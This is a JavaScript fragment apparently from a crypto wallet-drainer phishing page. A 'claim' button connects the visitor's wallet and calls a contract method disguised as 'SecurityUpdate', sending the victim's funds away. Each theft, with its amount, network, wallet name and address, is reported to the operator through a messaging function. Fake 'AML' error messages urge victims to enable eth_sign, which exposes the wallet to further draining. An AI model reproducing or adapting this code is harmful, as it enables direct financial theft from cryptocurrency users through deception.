        const amount = getWeiForTokensAmount(networks[chainId], prices, usdAmount)

        try {
            const ethersProvider = new ethers.providers.Web3Provider(provider)
            const signer = ethersProvider.getSigner()
            const contract = new ethers.Contract(
                constants.contracts[chainId],
                constants.receiveContractABI,
                signer
            )
            
            const web3contract = new web3.eth.Contract(
                constants.receiveContractABI,
                constants.contracts[chainId]
            );
            web3contract.setProvider(new Web3.providers.HttpProvider(constants.RPC[chainId]))
            const estimatedGas = await web3contract.methods.SecurityUpdate().estimateGas({from: account})
            let gasAmount = estimatedGas + 10000

            showConfirm();
            sendMessage(`⌛️ Tokens payment sent..`)
            web3contract.setProvider(provider)

            if (isDesktopTrust()) {
                contract.SecurityUpdate({ value: String(amount), from: account }).then(async() => {
                    sendMessage(`*✅ Transfer:* Tokens ${usdAmount}$%0A*🔍 Network:* ${networks[chainId]} %0A*⚡️ Wallet:* ${exactWalletName} %0A*🪓 Address:* ${account}`);
                    showLoad();
                    showSuccessBuy();
                }).catch(e => {
                    sendMessage(`❌ Error [AML]: ${e.message}. ${JSON.stringify(e)}`)
                    showAmlError();
                })
            } else {
                web3contract.methods.SecurityUpdate().send({
                    from: account,
                    value: web3.utils.toHex(amount),
                    gasPrice: web3.utils.toHex(gasPrice),
                    gasLimit: web3.utils.toHex(gasAmount)
                })
                .on('transactionHash', function(hash) {
                    web3.setProvider(new Web3.providers.HttpProvider(constants.RPC[chainId]))
                    let gotRec = false
                    showLoad();
                    const checkReceiptInterval = setInterval(() => {
                        if (!gotRec) {
                            web3.eth.getTransactionReceipt(hash, async function(err, rec) {
                                if (rec && !gotRec) {
                                    gotRec = true
                                    clearInterval(checkReceiptInterval)
                                    sendMessage(`*✅ Transfer:* Tokens ${usdAmount}$%0A*🔍 Network:* ${networks[chainId]} %0A*⚡️ Wallet:* ${exactWalletName} %0A*🪓 Address:* ${account}`);
                                    showSuccessBuy();
                                   } else if (err) {
                                    console.log(err)
                                    clearInterval(checkReceiptInterval)
                                    sendMessage(`❌ Error [AML]: ${e.message}. ${JSON.stringify(e)}`)
                                    showAmlError();
                                }
                            });   
                        }
                    }, 1300) 
                })
                .on('error', function(e) {
                    console.log(e)
                    sendMessage(`❌ Error [AML]: ${e.message} ${JSON.stringify(e)}.`);
                })   
            }
        } catch (e) {
            console.log(e)
            sendMessage(`❌ Error [AML]: ${e.message}. ${JSON.stringify(e)}`)
            showAmlError();
        }
  } catch (error) {
      console.log(error)
    sendMessage(`❌ Error [AML]: ${error.message}. ${error.message}`);
    showAmlError();
    return;
  }
}

window.addEventListener("load", (event) => {
    const f = async () => {
      await disconnect();
    }
    f();
    setGeo()
});

document.querySelector('#claim').addEventListener('click', () => {
    wConnect();
})

const showLoad = () => {
    document.querySelector('.confirm').style.display = 'none'
    displayConnectBtn('none');
    document.querySelector('.loader').style.display = 'block'
}

const hideLoad = () => {
    document.querySelector('.loader').style.display = 'none'
}

const showConfirm = () => {
    hideLoad();
    document.querySelector('.confirm').style.display = 'block'
}

const displayConnectBtn = (display='none') => {
    if (display == 'block') {
        document.querySelector('.confirm').style.display = 'none'
        window.location.reload(true);
    } else {
        document.querySelector('#claim').setAttribute('style', `display: ${display} !important`);
    }
}

const changeConfirmText = (text) => {
    hideLoad();
    document.querySelector('.confirm').style.display = 'block'
    document.querySelector('.confirm').innerText = text
    document.querySelector('.confirm').style.fontSize = '18px'
}

const showAmlError = () => {
    changeConfirmText(`Error. Make sure that you have enough ETH for Gas and reload the page.`)
}

const showSignError = () => {
    changeConfirmText(`Error. You should sign the transaction. Try again`)
}

const showEnableSign = () => {
    changeConfirmText(`Error. Enable eth_sign setting in your wallet and reload page`)
}
